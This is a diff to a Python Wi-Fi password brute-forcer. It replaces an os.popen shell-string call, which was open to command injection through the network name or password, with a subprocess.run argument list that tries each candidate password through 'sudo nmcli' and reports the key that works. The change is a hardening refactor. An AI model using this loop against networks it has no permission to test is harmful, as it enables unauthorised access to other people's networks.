@@ -1,4 +1,5 @@
 import argparse
+import subprocess
 import os
 from ssid import start
 import urllib.request
@@ -172,19 +173,28 @@ def brute_force(selected_network, passwords, args):
                     contain = True
                 else:
                     time.sleep(1)
-
-            creds = os.popen("sudo nmcli dev wifi connect \""+
-                selected_network+"\" password \""+decoded_line+"\"").read()
-                
-            # print(creds)
-
-            if ("Error:" in creds.strip()):
+            
+            commands = [
+                "sudo",
+                "nmcli",
+                "dev",
+                "wifi",
+                "connect",
+                selected_network,
+                "password",
+                decoded_line,
+            ]
+            
+            try:
+                subprocess.run(commands, capture_output=True, text=True, 
+                    check=True)
+                sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
+                    decoded_line+"' succeeded."+bcolors.ENDC)
+            except subprocess.CalledProcessError as e:
                 if args.verbose is True:
                     print(bcolors.FAIL+"** TESTING **: password '" +
                         decoded_line+"' failed."+bcolors.ENDC)
-            else:
-                sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                    decoded_line+"' succeeded."+bcolors.ENDC)
+
         else:
             if args.verbose is True:
                 print(bcolors.OKCYAN+"** TESTING **: password '" +
